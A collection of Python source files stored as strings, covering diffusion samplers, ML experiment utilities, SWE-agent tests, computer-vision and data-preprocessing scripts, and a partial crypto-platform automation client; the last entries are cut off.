    "try:\r\n    import smea_sampling\r\n    from smea_sampling import sample_euler_dy, sample_euler_smea_dy, sample_euler_negative, sample_euler_dy_negative\r\n\r\n    if smea_sampling.BACKEND == \"WebUI\":\r\n        from modules import scripts, sd_samplers_common, sd_samplers\r\n        from modules.sd_samplers_kdiffusion import sampler_extra_params, KDiffusionSampler\r\n\r\n        class SMEA(scripts.Script):\r\n            def title(self):\r\n                \"SMEA Samplers\"\r\n\r\n            def show(self, is_img2img):\r\n                return False\r\n\r\n            def __init__(self):\r\n                if not smea_sampling.INITIALIZED:\r\n                    samplers_smea = [\r\n                        (\"Euler Dy\", sample_euler_dy, [\"k_euler_dy\"], {}),\r\n                        (\"Euler SMEA Dy\", sample_euler_smea_dy, [\"k_euler_smea_dy\"], {}),\r\n                        (\"Euler Negative\", sample_euler_negative, [\"k_euler_negative\"], {}),\r\n                        (\"Euler Negative Dy\", sample_euler_dy_negative, [\"k_euler_negative_dy\"], {}),\r\n                    ]\r\n                    samplers_data_smea = [\r\n                        sd_samplers_common.SamplerData(label, lambda model, funcname=funcname: KDiffusionSampler(funcname, model), aliases, options)\r\n                        for label, funcname, aliases, options in samplers_smea\r\n                        if callable(funcname)\r\n                    ]\r\n                    sampler_extra_params[\"sample_euler_dy\"] = [\"s_churn\", \"s_tmin\", \"s_tmax\", \"s_noise\"]\r\n                    sampler_extra_params[\"sample_euler_smea_dy\"] = [\"s_churn\", \"s_tmin\", \"s_tmax\", \"s_noise\"]\r\n                    sampler_extra_params[\"sample_euler_negative\"] = [\"s_churn\", \"s_tmin\", \"s_tmax\", \"s_noise\"]\r\n                    sampler_extra_params[\"sample_euler_dy_negative\"] = [\"s_churn\", \"s_tmin\", \"s_tmax\", \"s_noise\"]\r\n                    sd_samplers.all_samplers.extend(samplers_data_smea)\r\n                    sd_samplers.all_samplers_map = {x.name: x for x in sd_samplers.all_samplers}\r\n                    sd_samplers.set_samplers()\r\n                    smea_sampling.INITIALIZED = True\r\n\r\nexcept ImportError as _:\r\n    pass\r\n",
    "import re\n\n\ndef generate_experiment_id(\n    name,\n    split,\n    model_name,\n    pooling_mode,\n    train_batch_size,\n    max_seq_length,\n    bidirectional,\n    epochs,\n    seed,\n    warmup_steps,\n    lr,\n    lora_r,\n):\n    experiment_id = name + \"_\" + split\n\n    if isinstance(model_name, str):\n        experiment_id += f\"_m-{model_name}\"\n    if isinstance(pooling_mode, str):\n        experiment_id += f\"_p-{pooling_mode}\"\n    if isinstance(train_batch_size, int):\n        experiment_id += f\"_b-{train_batch_size}\"\n    if isinstance(max_seq_length, int):\n        experiment_id += f\"_l-{max_seq_length}\"\n    if isinstance(bidirectional, bool):\n        experiment_id += f\"_bidirectional-{bidirectional}\"\n    if isinstance(epochs, int):\n        experiment_id += f\"_e-{epochs}\"\n    if isinstance(seed, int):\n        experiment_id += f\"_s-{seed}\"\n    if isinstance(warmup_steps, int):\n        experiment_id += f\"_w-{warmup_steps}\"\n    if isinstance(lr, float):\n        experiment_id += f\"_lr-{lr}\"\n    if isinstance(lora_r, int):\n        experiment_id += f\"_lora_r-{lora_r}\"\n\n    return experiment_id\n\ndef parse_experiment_id(experiment_id):\n    \"\"\"\n    Parses experiment identifier into key-value pairs.\n\n    Args:\n        experiment_id (str): Unique experiment identifier to parse.\n\n    Returns:\n        dict: Dictionary containing the parsed key-value pairs.\n    \"\"\"\n    regex, post_regex = \"\", \"\"\n    if \"/\" in experiment_id:\n        regex = \"([A-Za-z0-9-_./]*)/\"\n        post_regex = \"/([A-Za-z0-9-_./]*)\"\n    regex += \"([A-Za-z0-9-_.]+)\"\n    regex += \"_m-([A-Z-a-z0-9-_.]+)\"\n    regex += \"_p-([A-Z-a-z0-9-_.]+)\"\n    regex += \"_b-(\\d+)\"\n    regex += \"_l-(\\d+)\"\n    regex += \"_bidirectional-([A-Z-a-z0-9-_.]+)\"\n    regex += \"_e-(\\d+)\"\n    regex += \"_s-(\\d+)\"\n    regex += \"_w-(\\d+)\"\n    regex += \"_lr-([A-Z-a-z0-9-_.]+)\"\n    regex += \"_lora_r-(\\d+)\"\n    regex += post_regex\n\n    parts = re.match(regex, experiment_id).groups()\n    if post_regex != \"\":\n        parts = parts[1:-1]\n\n    result = {\n        \"name\": parts[0],\n        \"model_name_or_path\": parts[1],\n        \"pooling_mode\": parts[2],\n        \"train_batch_size\": int(parts[3]),\n        \"max_seq_length\": int(parts[4]),\n        \"bidirectional\": parts[5] == \"True\",\n        \"epochs\": int(parts[6]),\n        \"seed\": int(parts[7]),\n        \"warmup_steps\": int(parts[8]),\n        \"lr\": float(parts[9]),\n        \"lora_r\": int(parts[10]),\n    }\n\n    return result\n",
    "# This code is based on https://github.com/Mathux/ACTOR.git\nimport torch\nfrom ..utils import rotation_conversions as geometry\n\n\nfrom ..models.smpl import SMPL, JOINTSTYPE_ROOT\n# from .get_model import JOINTSTYPES\nJOINTSTYPES = [\"a2m\", \"a2mpl\", \"smpl\", \"vibe\", \"vertices\"]\n\n\nclass Rotation2xyz:\n    def __init__(self, device, dataset='amass'):\n        self.device = device\n        self.dataset = dataset\n        self.smpl_model = SMPL().eval().to(device)\n\n    def __call__(self, x, mask, pose_rep, translation, glob,\n                 jointstype, vertstrans, betas=None, beta=0,\n                 glob_rot=None, get_rotations_back=False, **kwargs):\n        if pose_rep == \"xyz\":\n            return x\n\n        if mask is None:\n            mask = torch.ones((x.shape[0], x.shape[-1]), dtype=bool, device=x.device)\n\n        if not glob and glob_rot is None:\n            raise TypeError(\"You must specify global rotation if glob is False\")\n\n        if jointstype not in JOINTSTYPES:\n            raise NotImplementedError(\"This jointstype is not implemented.\")\n\n        if translation:\n            x_translations = x[:, -1, :3]\n            x_rotations = x[:, :-1]\n        else:\n            x_rotations = x\n\n        x_rotations = x_rotations.permute(0, 3, 1, 2)\n        nsamples, time, njoints, feats = x_rotations.shape\n\n        # Compute rotations (convert only masked sequences output)\n        if pose_rep == \"rotvec\":\n            rotations = geometry.axis_angle_to_matrix(x_rotations[mask])\n        elif pose_rep == \"rotmat\":\n            rotations = x_rotations[mask].view(-1, njoints, 3, 3)\n        elif pose_rep == \"rotquat\":\n            rotations = geometry.quaternion_to_matrix(x_rotations[mask])\n        elif pose_rep == \"rot6d\":\n            rotations = geometry.rotation_6d_to_matrix(x_rotations[mask])\n        else:\n            raise NotImplementedError(\"No geometry for this one.\")\n\n        if not glob:\n            global_orient = torch.tensor(glob_rot, device=x.device)\n            global_orient = geometry.axis_angle_to_matrix(global_orient).view(1, 1, 3, 3)\n            global_orient = global_orient.repeat(len(rotations), 1, 1, 1)\n        else:\n            global_orient = rotations[:, 0]\n            rotations = rotations[:, 1:]\n\n        if betas is None:\n            betas = torch.zeros([rotations.shape[0], self.smpl_model.num_betas],\n                                dtype=rotations.dtype, device=rotations.device)\n            betas[:, 1] = beta\n            # import ipdb; ipdb.set_trace()\n        out = self.smpl_model(body_pose=rotations, global_orient=global_orient, betas=betas)\n\n        # get the desirable joints\n        joints = out[jointstype]\n\n        x_xyz = torch.empty(nsamples, time, joints.shape[1], 3, device=x.device, dtype=x.dtype)\n        x_xyz[~mask] = 0\n        x_xyz[mask] = joints\n\n        x_xyz = x_xyz.permute(0, 2, 3, 1).contiguous()\n\n        # the first translation root at the origin on the prediction\n        if jointstype != \"vertices\":\n            rootindex = JOINTSTYPE_ROOT[jointstype]\n            x_xyz = x_xyz - x_xyz[:, [rootindex], :, :]\n\n        if translation and vertstrans:\n            # the first translation root at the origin\n            x_translations = x_translations - x_translations[:, :, [0]]\n\n            # add the translation to all the joints\n            x_xyz = x_xyz + x_translations[:, None, :, :]\n\n        if get_rotations_back:\n            return x_xyz, rotations, global_orient\n        else:\n            return x_xyz\n",
    "import dataclasses\nimport os\nfrom pathlib import Path\nimport subprocess\nimport pytest\nimport yaml\nfrom sweagent.environment.swe_env import EnvHook, EnvironmentArguments, SWEEnv\nfrom contextlib import contextmanager\nimport docker\n\n\n@pytest.fixture(scope=\"module\")\ndef test_env_args(tmpdir_factory, ):\n    \"\"\"This will use a persistent container\"\"\"\n    local_repo_path = tmpdir_factory.getbasetemp() / \"swe-agent-test-repo\"\n    clone_cmd = [\"git\", \"clone\", \"https://github.com/klieret/swe-agent-test-repo\", local_repo_path]\n    subprocess.run(clone_cmd, check=True)\n    data_path = local_repo_path / \"problem_statements\" / \"1.md\"\n    test_env_args = EnvironmentArguments(\n        data_path=str(data_path),\n        repo_path=str(local_repo_path),\n        image_name=\"sweagent/swe-agent:latest\",\n        container_name=\"test-container-134245890345098\",\n    )\n    yield test_env_args\n    # Cleanup (after session ends)\n    client = docker.from_env()\n    container = client.containers.get(test_env_args.container_name)\n    container.remove(force=True)\n\n\n@contextmanager\ndef swe_env_context(env_args):\n    \"\"\"Context manager to make sure we close the shell on the container\n    so that we can reuse it.\n    \"\"\"\n\n    env = SWEEnv(env_args)\n    try:\n        yield env\n    finally:\n        env.close()\n\n\n@pytest.mark.slow\ndef test_init_swe_env(test_env_args):\n    with swe_env_context(test_env_args) as env:\n        env.reset()\n\n\n@pytest.mark.slow\ndef test_init_swe_env_non_persistent(test_env_args):\n    test_env_args = dataclasses.replace(test_env_args, container_name=None)\n    with swe_env_context(test_env_args) as env:\n        env.reset()\n\n\n@pytest.mark.slow\ndef test_execute_setup_script(tmp_path, test_env_args):\n    test_script = \"echo 'hello world'\"\n    script_path = Path(tmp_path / \"test_script.sh\")\n    script_path.write_text(test_script)\n    test_env_args = dataclasses.replace(test_env_args, environment_setup=script_path)\n    with swe_env_context(test_env_args) as env:\n        env.reset()\n\n\n@pytest.mark.slow\ndef test_execute_environment(tmp_path, test_env_args):\n    test_env = {\n        \"python\": \"3.6\",\n        \"packages\": \"pytest\",\n        \"pip_packages\": [\"tox\"],\n        \"install\": \"echo 'installing'\",\n    }\n    env_config_path = Path(tmp_path / \"env_config.yml\")\n    env_config_path.write_text(yaml.dump(test_env))\n    test_env_args = dataclasses.replace(test_env_args, environment_setup=env_config_path)\n    with swe_env_context(test_env_args) as env:\n        env.reset()\n\n\n@pytest.mark.slow\ndef test_open_pr(test_env_args):\n    test_env_args = dataclasses.replace(test_env_args, data_path=\"https://github.com/klieret/swe-agent-test-repo/issues/1\", repo_path=\"\")\n    with swe_env_context(test_env_args) as env:\n        env.reset()\n        env.open_pr(_dry_run=True, trajectory=[])\n\n\n@pytest.mark.slow\ndef test_interrupt_close(test_env_args):\n    with swe_env_context(test_env_args) as env:\n        env.reset()\n        env.interrupt()\n\n\n@pytest.mark.slow\ndef test_communicate_old(test_env_args):\n    del os.environ[\"SWE_AGENT_EXPERIMENTAL_COMMUNICATE\"]\n    try:\n        with swe_env_context(test_env_args) as env:\n            env.reset()\n    except:\n        raise\n    finally:\n        os.environ[\"SWE_AGENT_EXPERIMENTAL_COMMUNICATE\"] = \"1\"\n\n\n@pytest.mark.slow\ndef test_env_with_hook(test_env_args):\n    with swe_env_context(test_env_args) as env:\n        env.add_hook(EnvHook())\n        env.reset()",
    "import pandas as pd\nfrom sklearn.model_selection import train_test_split\nfrom sklearn.metrics import roc_auc_score\nfrom lightgbm import LGBMClassifier\n\n# Load the data\ntrain_data = pd.read_csv(\"./input/train.csv\")\ntest_data = pd.read_csv(\"./input/test.csv\")\n\n# Frequency encode the 'f_27' feature\nfreq_encoder = train_data[\"f_27\"].value_counts(normalize=True)\ntrain_data[\"f_27\"] = train_data[\"f_27\"].map(freq_encoder)\ntest_data[\"f_27\"] = test_data[\"f_27\"].map(freq_encoder).fillna(0)\n\n# Separate features and target\nX = train_data.drop([\"id\", \"target\"], axis=1)\ny = train_data[\"target\"]\n\n# Split the data into training and validation sets\nX_train, X_val, y_train, y_val = train_test_split(X, y, test_size=0.2, random_state=42)\n\n# Initialize the model\nmodel = LGBMClassifier()\n\n# Train the model\nmodel.fit(X_train, y_train)\n\n# Predict probabilities for the validation set\nval_probs = model.predict_proba(X_val)[:, 1]\n\n# Calculate the ROC AUC score\nval_auc = roc_auc_score(y_val, val_probs)\nprint(f\"Validation ROC AUC Score: {val_auc}\")\n\n# Predict probabilities for the test set\ntest_probs = model.predict_proba(test_data.drop([\"id\"], axis=1))[:, 1]\n\n# Create a submission file\nsubmission = pd.DataFrame({\"id\": test_data[\"id\"], \"target\": test_probs})\nsubmission.to_csv(\"./working/submission.csv\", index=False)\n",
    "# -----------------------------------------------------------\n# AUTHOR --------> Francisco Contreras\n# OFFICE --------> Senior VFX Compositor, Software Developer\n# WEBSITE -------> https://vinavfx.com\n# -----------------------------------------------------------\nimport os\nimport nuke  # type: ignore\nfrom ..settings import COMFYUI_DIR\nfrom ..nuke_util.nuke_util import get_nuke_path\n\nstate_dir = '{}/comfyui_state'.format(get_nuke_path())\nif not os.path.isdir(state_dir):\n    os.mkdir(state_dir)\n\nif not getattr(nuke, 'comfyui_running', False):\n    nuke.comfyui_running = False\n\nimage_inputs = ['image', 'frames', 'pixels']\nmask_inputs = ['mask', 'attn_mask', 'mask_optional']\n\n\ndef get_available_name(prefix, directory):\n    prefix += '_'\n    taken_names = set(os.listdir(directory))\n\n    for i in range(10000):\n        potential_name = '{}{:04d}'.format(prefix, i)\n        if potential_name not in taken_names:\n            return potential_name\n\n    return prefix\n\n\ndef get_comfyui_dir():\n    if os.path.isdir(os.path.join(COMFYUI_DIR, 'comfy')):\n        return COMFYUI_DIR\n\n    nuke.message('Directory \"{}\" does not exist'.format(COMFYUI_DIR))\n\n    return ''\n",
    "import FreeSimpleGUI as sg\nimport random\n# ------- Sort visualizer. Displays bar chart representing list items -------\nBAR_SPACING, BAR_WIDTH, EDGE_OFFSET = 11, 10, 3\nDATA_SIZE = GRAPH_SIZE = (700, 500)      # width, height of the graph portion\n\n\ndef bubble_sort(arr):\n    def swap(i, j):\n        arr[i], arr[j] = arr[j], arr[i]\n    n = len(arr)\n    swapped = True\n    x = -1\n    while swapped:\n        swapped = False\n        x = x + 1\n        for i in range(1, n - x):\n            if arr[i - 1] > arr[i]:\n                swap(i - 1, i)\n                swapped = True\n                yield arr\n\n\ndef draw_bars(graph, items):\n    # type: (sg.Graph, List)->None\n    for i, item in enumerate(items):\n        graph.draw_rectangle(top_left=(i * BAR_SPACING + EDGE_OFFSET, item),\n                             bottom_right=(i * BAR_SPACING + EDGE_OFFSET + BAR_WIDTH, 0),\n                             fill_color='#76506d')\n\n\ndef main():\n    sg.theme('LightGreen')\n    # Make list to sort\n    num_bars = DATA_SIZE[0]//(BAR_WIDTH+1)\n    list_to_sort = [DATA_SIZE[1]//num_bars*i for i in range(1, num_bars)]\n    random.shuffle(list_to_sort)\n\n    # define window layout\n    graph = sg.Graph(GRAPH_SIZE, (0, 0), DATA_SIZE)\n    layout = [[graph],\n              [sg.Text('Speed    Faster'), sg.Slider((0, 20), orientation='h', default_value=10, key='-SPEED-'), sg.Text('Slower')]]\n\n    window = sg.Window('Sort Demonstration', layout, finalize=True)\n    # draw the initial window's bars\n    draw_bars(graph, list_to_sort)\n\n    sg.popup('Click OK to begin Bubblesort')    # Wait for user to start it up\n    bsort = bubble_sort(list_to_sort)           # get an iterator for the sort\n    timeout = 10                                  # start with 10ms delays between draws\n    while True:                                 # ----- The event loop -----\n        event, values = window.read(timeout=timeout)\n        if event == sg.WIN_CLOSED:\n            break\n        try:\n            partially_sorted_list = bsort.__next__()\n        except:\n            sg.popup('Sorting done!')\n            break\n        graph.erase()\n        draw_bars(graph, partially_sorted_list)\n        timeout = int(values['-SPEED-'])\n\n    window.close()\n\n\nmain()\n",
    "import os\nimport argparse\nimport json\n\nfrom llava.eval.m4c_evaluator import EvalAIAnswerProcessor\n\n\ndef parse_args():\n    parser = argparse.ArgumentParser()\n    parser.add_argument('--annotation-file', type=str, required=True)\n    parser.add_argument('--result-file', type=str, required=True)\n    parser.add_argument('--result-upload-file', type=str, required=True)\n    return parser.parse_args()\n\n\nif __name__ == '__main__':\n\n    args = parse_args()\n\n    os.makedirs(os.path.dirname(args.result_upload_file), exist_ok=True)\n\n    results = []\n    error_line = 0\n    for line_idx, line in enumerate(open(args.result_file)):\n        try:\n            results.append(json.loads(line))\n        except:\n            error_line += 1\n    results = {x['question_id']: x['text'] for x in results}\n    test_split = [json.loads(line) for line in open(args.annotation_file)]\n    split_ids = set([x['question_id'] for x in test_split])\n\n    print(f'total results: {len(results)}, total split: {len(test_split)}, error_line: {error_line}')\n\n    all_answers = []\n\n    answer_processor = EvalAIAnswerProcessor()\n\n    for x in test_split:\n        assert x['question_id'] in results\n        all_answers.append({\n            'image': x['image'],\n            'answer': answer_processor(results[x['question_id']])\n        })\n\n    with open(args.result_upload_file, 'w') as f:\n        json.dump(all_answers, f)\n",
    "import json\nimport re\nfrom mosestokenizer import MosesTokenizer, MosesDetokenizer\n\n\ndetokenizer = MosesDetokenizer()\n\ndef intersection(lst1, lst2):\n    lst3 = [value for value in lst1 if value in lst2]\n    return lst3\n\ndef process_data_tacred(input_json_file, output_file_path):\n    fileobject = open(input_json_file)\n    data = json.load(fileobject)\n    processed_data = []\n    relation_set = []\n    print(len(data))\n    count = 0\n    for entry in data:\n        count += 1\n        print(count)\n        with MosesDetokenizer('en') as detokenize:\n            sentence = detokenize(entry['token'])\n            subject_entity = detokenize(entry['token'][entry['subj_start']:entry['subj_end']+1])\n            object_entity = detokenize(entry['token'][entry['obj_start']:entry['obj_end']+1])\n\n\n        relation = entry['relation']\n        if relation not in relation_set:\n            relation_set.append(relation)\n\n        processed_data.append({\n            \"sentence\": sentence,\n            \"relation\": relation,\n            \"subject_entity\": subject_entity,\n            \"object_entity\": object_entity\n        })\n    print(relation_set)\n    print(len(relation_set))\n\n    with open(output_file_path, 'w', encoding='utf-8') as json_file:\n        json.dump(processed_data, json_file, ensure_ascii=False, indent=2)\n\n\n\nif __name__ == \"__main__\":\n    # preprocess for tacred\n    train_json_file = 'data/tacred/data/json/train.json'\n    test_json_file = 'data/tacred/data/json/test.json'\n    train_output_file = 'processed_data/train_tacred.json'\n    test_output_file = 'processed_data/test_tacred.json'\n    process_data_tacred(train_json_file, train_output_file)\n    process_data_tacred(test_json_file, test_output_file)",
    "\"\"\"Evaluation functions\"\"\"\n\nimport math\nimport typing\n\nimport definition\n\nCOORDINATES: list[tuple[int, int, int]] = [\n    (-1, -1, -1), (-1, -1, 0), (-1, -1, 1),\n    (-1, 0, -1), (-1, 0, 0), (-1, 0, 1),\n    (-1, 1, -1), (-1, 1, 0), (-1, 1, 1),\n    (0, -1, -1), (0, -1, 0), (0, -1, 1),\n    (0, 0, -1), (0, 0, 0), (0, 0, 1),\n    (0, 1, -1), (0, 1, 0), (0, 1, 1),\n    (1, -1, -1), (1, -1, 0), (1, -1, 1),\n    (1, 0, -1), (1, 0, 0), (1, 0, 1),\n    (1, 1, -1), (1, 1, 0), (1, 1, 1)\n]\n\nCOST: float = 8 + 4 * math.sqrt(2)\n\"\"\"average cost\"\"\"\n\n\nexponent = 2\n\"\"\"exponent of Minkowski distance\"\"\"\n\n\nh: typing.Callable[[list[int]], float] = None\n\"\"\"heuristic function\"\"\"\n\n\ndef chebyshev(data: list[int], ev: int = 0) -> float:\n    \"\"\"Chebyshev distance\"\"\"\n    for i, v in enumerate(data):\n        ev += max((\n            abs(COORDINATES[i][j] - COORDINATES[v][j]) for j in range(3)))\n    return ev\n\n\ndef euclidean(data: list[int], ev: int = 0) -> float:\n    \"\"\"Euclidean distance\"\"\"\n    for i, v in enumerate(data):\n        ev += math.hypot(\n            *(COORDINATES[i][j] - COORDINATES[v][j] for j in range(3)))\n    return ev\n\n\ndef manhattan(data: list[int], ev: int = 0) -> float:\n    \"\"\"Manhattan distance\"\"\"\n    for i, v in enumerate(data):\n        for j in range(3):\n            ev += abs(COORDINATES[i][j] - COORDINATES[v][j])\n    return ev\n\n\ndef hamming(data: list[int], ev: int = 0) -> int:\n    \"\"\"Hamming distance\"\"\"\n    for i, v in enumerate(data):\n        ev += i != v\n    return ev\n\n\ndef minkowski(data: list[int], ev: int = 0, *, p: float = 1/exponent) -> float:\n    \"\"\"Minkowski distance\"\"\"\n    for i, v in enumerate(data):\n        for j in range(3):\n            ev += abs(COORDINATES[i][j] - COORDINATES[v][j])**p\n    return ev**(1/p)\n\n\ndef custom(data: list[int], ev: int = 0) -> int:\n    \"\"\"Custom heuristic function\"\"\"\n    for i, v in enumerate(data):\n        if i in definition.SIDES:\n            ev += math.hypot(\n                *(COORDINATES[i][j] - COORDINATES[v][j] for j in range(3)))\n        elif i in definition.CORNERS:\n            for j in range(3):\n                ev += abs(COORDINATES[i][j] - COORDINATES[v][j])\n    return ev\n\n\ndef g(ev: int, op: definition.OPS) -> float:\n    \"\"\"cost function\"\"\"\n    if op in ('LR', 'UD', 'FB'):\n        return ev + COST / 2\n    return ev + COST\n\n\ndef f(ev: int, op: definition.Ways, data: list[int], depth: int, *, algo: definition.Algos) -> float:\n    \"\"\"evaluate function\"\"\"\n    match algo:\n        case 'BFS': return 0\n        case 'DFS': return depth - 1\n        case 'UCS': return g(ev, op)\n        case 'AS': return g(ev, op) + h(data)\n        case 'HC': return h(data)\n        case _: raise ValueError(algo)\n",
    "import cv2\r\n\r\ninput_video = \"sample/car.mp4\"\r\n\r\n\r\n# video Inference\r\n\r\n\r\ndef vid_inf(vid_path):\r\n    # Create a VideoCapture object\r\n    cap = cv2.VideoCapture(vid_path)\r\n    # get the video frames' width and height for proper saving of videos\r\n    frame_width = int(cap.get(3))\r\n    frame_height = int(cap.get(4))\r\n    fps = int(cap.get(cv2.CAP_PROP_FPS))\r\n    frame_size = (frame_width, frame_height)\r\n    fourcc = cv2.VideoWriter_fourcc(*\"mp4v\")\r\n    output_video = \"output_recorded.mp4\"\r\n\r\n    # create the `VideoWriter()` object\r\n    out = cv2.VideoWriter(output_video, fourcc, fps, frame_size)\r\n\r\n    # Create Background Subtractor MOG2 object\r\n    backSub = cv2.createBackgroundSubtractorMOG2()\r\n\r\n    # Check if camera opened successfully\r\n    if not cap.isOpened():\r\n        print(\"Error opening video file\")\r\n    count = 0\r\n    # Read until video is completed\r\n    while cap.isOpened():\r\n        # Capture frame-by-frame\r\n        ret, frame = cap.read()\r\n\r\n        if ret:\r\n            # Apply background subtraction\r\n            fg_mask = backSub.apply(frame)\r\n\r\n            # apply global threshol to remove shadows\r\n            retval, mask_thresh = cv2.threshold(fg_mask, 180, 255, cv2.THRESH_BINARY)\r\n\r\n            # set the kernal\r\n            kernel = cv2.getStructuringElement(cv2.MORPH_ELLIPSE, (3, 3))\r\n            # Apply erosion\r\n            mask_eroded = cv2.morphologyEx(mask_thresh, cv2.MORPH_OPEN, kernel)\r\n\r\n            # Find contours\r\n            contours, hierarchy = cv2.findContours(mask_eroded, cv2.RETR_EXTERNAL, cv2.CHAIN_APPROX_SIMPLE)\r\n\r\n            min_contour_area = 500  # Define your minimum area threshold\r\n            # filtering contours using list comprehension\r\n            large_contours = [cnt for cnt in contours if cv2.contourArea(cnt) > min_contour_area]\r\n            frame_out = frame.copy()\r\n            for cnt in large_contours:\r\n                x, y, w, h = cv2.boundingRect(cnt)\r\n                frame_out = cv2.rectangle(frame, (x, y), (x + w, y + h), (0, 0, 200), 3)\r\n\r\n            # saving the video file\r\n            out.write(frame_out)\r\n\r\n            # Display the resulting frame\r\n            cv2.imshow(\"Frame_final\", frame_out)\r\n\r\n            # Press Q on keyboard to exit\r\n            if cv2.waitKey(30) & 0xFF == ord(\"q\"):\r\n                break\r\n        else:\r\n            break\r\n\r\n    # When everything done, release the video capture and writer object\r\n    cap.release()\r\n    out.release()\r\n    # Closes all the frames\r\n    cv2.destroyAllWindows()\r\n\r\n\r\nvid_inf(input_video)\r\n",
    "import asyncio\nimport random\nimport time\nimport requests\nimport json\nfrom web3 import Web3\nfrom web3.middleware import geth_poa_middleware\nfrom loguru import logger\nfrom eth_account.messages import encode_defunct\nfrom fake_useragent import UserAgent\n\n\nclass WenXin:\n    def __init__(self, API_KEY, SECRET_KEY):\n        self.API_KEY = API_KEY\n        self.SECRET_KEY = SECRET_KEY\n        self.model_url = {\n            \"ErnieBot-turbo\": \"https://aip.baidubce.com/rpc/2.0/ai_custom/v1/wenxinworkshop/chat/eb-instant?\",\n            \"ErnieBot\": \"https://aip.baidubce.com/rpc/2.0/ai_custom/v1/wenxinworkshop/chat/completions?\",\n            \"BLOOMZ-7B\": \"https://aip.baidubce.com/rpc/2.0/ai_custom/v1/wenxinworkshop/chat/bloomz_7b1?\",\n            \"Yi-34B\": \"https://aip.baidubce.com/rpc/2.0/ai_custom/v1/wenxinworkshop/chat/yi_34b_chat\",\n        }\n        self.headers = {'Content-Type': 'application/json'}\n\n    def get_access_token(self):\n        url = \"https://aip.baidubce.com/oauth/2.0/token\"\n        params = {\"grant_type\": \"client_credentials\", \"client_id\": self.API_KEY, \"client_secret\": self.SECRET_KEY}\n        return str(requests.post(url, params=params).json().get(\"access_token\"))\n\n    def get_response(self, content, model_type='ErnieBot-turbo'):\n        url = self.model_url.get(model_type)\n        if url is None:\n            raise Exception(\"\u672a\u77e5\u7684\u6a21\u578b\u7c7b\u578b\")\n        access_token = self.get_access_token()\n        # url = url + \"access_token=\" + access_token\n        payload = json.dumps({\n            \"messages\": [\n                {\n                    \"role\": \"user\",\n                    \"content\": content,\n                },\n            ]\n        })\n\n        response = requests.request(\"POST\", url, headers=self.headers, data=payload,\n                                    params={\"access_token\": access_token})\n        result = json.loads(response.text)['result']\n\n        sentences = result.split('.')\n        max_len = 0\n        final_sentence = ''\n        for sent in sentences:\n            max_len += len(sent) + 1\n            if max_len >= 300:\n                break\n            final_sentence += sent + '.'\n\n        return final_sentence\n\n\nclass Xterio:\n    def __init__(self, address, private_key, user_agent, proxies_conf=None):\n        self.headers = {\n            'authority': 'api.xter.io',\n            'accept': '*/*',\n            'accept-language': 'zh-HK,zh-TW;q=0.9,zh;q=0.8',\n            'authorization': '',\n            'content-type': 'application/json',\n            'origin': 'https://xter.io',\n            'referer': 'https://xter.io/',\n            'sec-ch-ua': '\"Chromium\";v=\"122\", \"Not(A:Brand\";v=\"24\", \"Google Chrome\";v=\"122\"',\n            'sec-ch-ua-mobile': '?0',\n            'sec-ch-ua-platform': '\"Windows\"',\n            'sec-fetch-dest': 'empty',\n            'sec-fetch-mode': 'cors',\n            'sec-fetch-site': 'same-site',\n            'user-agent': user_agent,\n        }\n        self.address = address\n        self.private_key = private_key\n        self.proxies = proxies_conf\n        self.req_proxies = proxies_conf['proxies'] if self.proxies is not None else None\n        self.xter_rpc = \"https://xterio.alt.technology\"\n        self.bsc_rpc = \"https://bsc-pokt.nodies.app\"\n\n    def check_balance(self):\n        w3 = Web3(Web3.HTTPProvider(self.xter_rpc, request_kwargs=self.proxies))\n        balance = w3.eth.get_balance(self.address)\n\n        return balance\n\n    def deposit2xter(self, amount):\n        f = open('abi.json', 'r', encoding='utf-8')\n        contract_palio = json.load(f)['deposit']\n        abi = contract_palio['abi']\n        contract_address = Web3.to_checksum_address(contract_palio['contract'])\n\n        w3 = Web3(Web3.HTTPProvider(self.bsc_rpc, request_kwargs=self.proxies))\n        w3.middleware_onion.inject(geth_poa_middleware, layer=0)\n\n        contract = w3.eth.contract(address=contract_address, abi=abi)\n\n        amount = w3.to_wei(amount, 'ether')\n\n        gas = contract.functions.depositETH(200000, '0x').estimate_gas(\n            {\n                'from': self.address,\n                'value': amount,\n                'nonce': w3.eth.get_transaction_count(account=self.address)\n            }\n        )\n        transaction = contract.functions.depositETH(200000, '0x').build_transaction({\n            'from': self.address,\n            'gasPrice': w3.eth.gas_price,\n            'nonce': w3.eth.get_transaction_count(account=self.address),\n            'gas': gas,\n            'value': amount,\n        })\n        signed_transaction = w3.eth.account.sign_transaction(transaction, private_key=self.private_key)\n        tx_hash = w3.eth.send_raw_transaction(signed_transaction.rawTransaction)\n        w3.eth.wait_for_transaction_receipt(tx_hash)\n        logger.info(f\"\u5b58\u6b3ehash:{tx_hash.hex()}\")\n\n        logger.info(f\"deposit pending\u2026\u2026\")\n\n    def get_challenge(self):\n        response = requests.get(\n            f'https://api.xter.io/account/v1/login/wallet/{self.address.upper()}',\n            headers=self.headers,\n            proxi",
    "from typing import Dict, List\nimport torch\nimport numpy as np\nimport h5py\nfrom tqdm import tqdm\nimport zarr\nimport os\nimport shutil\nimport copy\nimport json\nimport hashlib\nfrom filelock import FileLock\nfrom threadpoolctl import threadpool_limits\nimport concurrent.futures\nimport multiprocessing\nfrom omegaconf import OmegaConf\nfrom diffusion_policy.common.pytorch_util import dict_apply, dict_apply_reduce, dict_apply_split\nfrom diffusion_policy.dataset.base_dataset import BaseImageDataset, LinearNormalizer\nfrom diffusion_policy.model.common.normalizer import LinearNormalizer, SingleFieldLinearNormalizer\nfrom diffusion_policy.model.common.rotation_transformer import RotationTransformer\nfrom diffusion_policy.codecs.imagecodecs_numcodecs import register_codecs, Jpeg2k\nfrom diffusion_policy.common.replay_buffer import ReplayBuffer\nfrom diffusion_policy.common.sampler import SequenceSampler, get_val_mask\nfrom diffusion_policy.common.normalize_util import (\n    robomimic_abs_action_only_dual_arm_normalizer_from_stat,\n    get_range_normalizer_from_stat,\n    get_image_range_normalizer,\n    get_identity_normalizer_from_stat,\n    array_to_stats\n)\nregister_codecs()\n\n\"\"\"\nJust a minor change here from the original DP code to allow for base pose obs and 6 pos dims\n\"\"\"\n\nclass RobomimicReplayImageDataset(BaseImageDataset):\n    def __init__(self,\n            shape_meta: dict,\n            dataset_path: str,\n            horizon=1,\n            pad_before=0,\n            pad_after=0,\n            n_obs_steps=None,\n            abs_action=False,\n            rotation_rep='rotation_6d', # ignored when abs_action=False\n            use_legacy_normalizer=False,\n            use_cache=False,\n            seed=42,\n            val_ratio=0.0\n        ):\n        rotation_transformer = RotationTransformer(\n            